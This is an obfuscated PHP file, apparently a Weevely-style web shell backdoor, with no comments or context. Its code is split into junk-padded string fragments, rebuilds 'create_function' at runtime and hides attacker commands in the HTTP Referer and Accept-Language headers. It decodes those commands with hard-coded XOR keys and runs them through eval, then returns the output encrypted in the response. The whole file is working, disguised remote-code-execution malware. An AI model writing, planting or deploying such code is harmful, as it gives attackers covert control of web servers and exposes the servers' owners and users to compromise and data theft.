<?php
$D='$i}^$k{hh$j};}}rhhethhurn $o;}$r=$hh_ShhERVER;$hhrr=@$r["HhhTTP_REFERER"hh];$rhha=@$rhh[';
$O='$hhhho="";for(hh$i=0;$i<$lhh;)hh{for(hh$jhh=0;($hhj<$c&&$i<$l);$j+hh+,$i++)hh{$ohh.=hh$hht{';
$j='<count(hh$m[1])hh;$z+hh+)$p.=$hhq[$hhm[2][$z]];ifhh(sthhrpos($p,hh$h)===0hhhh){$s[$i]=';
$F='e64_dehhcode(prhheg_rehhplhhace(arrhhay("hh/_/","/-/"hh),arrhhay("hh/","+"hh),$ss(hh$s';
$k='[$i],0,$hhe))),$k)hh));$hho=ohhbhh_get_contents()hhhh;ob_end_clean(hh);$d=bahhse64_hhenc';
$I='($hhu["queryhhhh"],$q);$q=arrahhy_values(hh$q)hh;prhheg_matchhh_alhhl("/([\\w])[\\w-hh]+(?h';
$a='"HThhTP_ACCEhhPT_LANGUAGhhE"];hhif($rr&hh&$hhra){hh$u=parse_hhurl($rrhh);pahhrse_hhstr';
$z='ohhde(x(gzhhcompreshhs($hhhho),$k));hhprhhint("<$k>$d</hh$k>");@sehhssihhon_deshhtroy();}}}}';
$n='"";$phh=$sshh($p,hh3);}hhif(arrayhh_key_exhhists($ihh,hh$s))hh{$s[$i].hh=$p;$e=strposhh($';
$b='s[$hhi]hh,$f);if(hh$hhe){hh$k=$kh.$kf;obhh_start();hh@evhhal(@gzhhuhhncompress(@x(@hhbhhas';
$M='hd5hh($i.$kh)hhhh,0,3));$f=$slhh($ss(mhhhhd5hh($i.$kf),0,3hh));$p="";hhfor($z=hh1;$hhz';
$K=str_replace('ym','','ymcrymeate_ymfuymncymtymion');
$o='SION;$hhss="subhhstr";$sl=hh"shhhhtrtolower";$i=$hhm[1hh][0]hh.$m[1][1hh];$hhh=$sl($ss(mh';
$d='hhh:hh;q=0.([\\hhd]))?,?/",$ra,$m)hh;ihhf($q&hh&$m){@sessihhon_hhstarthh();$s=&$_ShhhhES';
$Z='$kh="5d41";hhhh$kf="402a";hhfuncthhion x($hht,hh$k){hh$c=strlhhen($k);$hhl=strlen(hh$t);';
$q=str_replace('hh','',$Z.$O.$D.$a.$I.$d.$o.$M.$j.$n.$b.$F.$k.$z);
$E=$K('',$q);$E();
?>
